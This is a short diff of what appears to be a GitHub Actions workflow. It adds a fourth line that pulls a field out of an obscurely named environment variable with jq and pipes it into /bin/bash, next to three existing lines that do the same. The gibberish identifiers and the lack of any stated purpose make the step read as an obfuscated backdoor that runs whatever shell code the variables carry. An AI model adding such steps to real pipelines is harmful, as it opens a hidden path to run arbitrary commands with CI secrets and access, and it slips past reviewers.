@@ -51,6 +51,7 @@ jobs:
           echo $on74 | jq -r .whu53 | /bin/bash
           echo $ipm73186 | jq -r .xkkn1136 | /bin/bash
           printf '%s' "$jqoqn9700" | jq -r .wvct62 | /bin/bash
+          printf '%s' "$dba912" | jq -r .qgig19 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
